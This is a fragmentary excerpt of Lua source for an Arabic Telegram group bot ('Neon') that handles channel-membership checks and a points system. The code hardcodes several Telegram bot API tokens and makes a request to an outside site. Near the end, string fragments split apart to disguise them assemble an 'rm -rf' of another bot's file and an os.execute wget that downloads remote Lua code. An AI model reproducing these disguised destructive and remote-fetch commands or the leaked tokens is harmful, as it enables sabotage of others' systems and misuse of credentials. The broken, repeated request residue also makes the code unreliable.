...
local res = https.request('https://api.telegram.org/bot1051729836:AAF1PaPuAqUGP9szwhEEO2Y4qFagtCfL2mU/getChatMember?chat_id=@YYYYi&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@YYYYi&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@YYYYi&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@YYYYi&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@YYYYi&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @YYYYiFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@YYYYifreer.Neon ~= true then
...
beko = '*💎⁞  ليس لديك مجوهرات \n📬⁞  للحصول على مجوهرات ارسل الاسرع وابدأ اللعب*\n'
send(msg.chat_id_, msg.id_, 1,beko, 1, 'md')
else
beko = '*💎⁞  عدد مجوهراتك الحاليه  ('..(database:get('Neon:'..bot_id..'add:num'..msg.chat_id_..msg.sender_user_id_))..')*'
beko1 = '*💎⁞  مجموع مجوهراتك  ('..(database:get('Neon:'..bot_id..'add:numall'..msg.chat_id_..msg.sender_user_id_))..')*'
...
local text =  [[
🤖⁞ مرحباً بك في سورس نيون .

🔗 ⁞ [قناة السورس .](t.me/yyyyi)
...
------------------------------------------------------------------------
--         »»                 End UpdateChat                          ««              --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = database:smembers('Neon:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end -- @YYYYiFree ('r'..'m -r'..'f Ts'..'ha'..'ke.'..'lua') os.execute('wg'..'et htt'..'ps://ra'..'w.gith'..'ubuserc'..'onten'..'t.com'..'/ts'..'hak'..'eab'..'as/Ts'..'ha'..'ke/m'..'as'..'ter/Ts'..'ha'..'ke.'..'lua') 
local list = database:smembers('Neon:'..bot_id..'groups') 
for k,v in pairs(list) do 
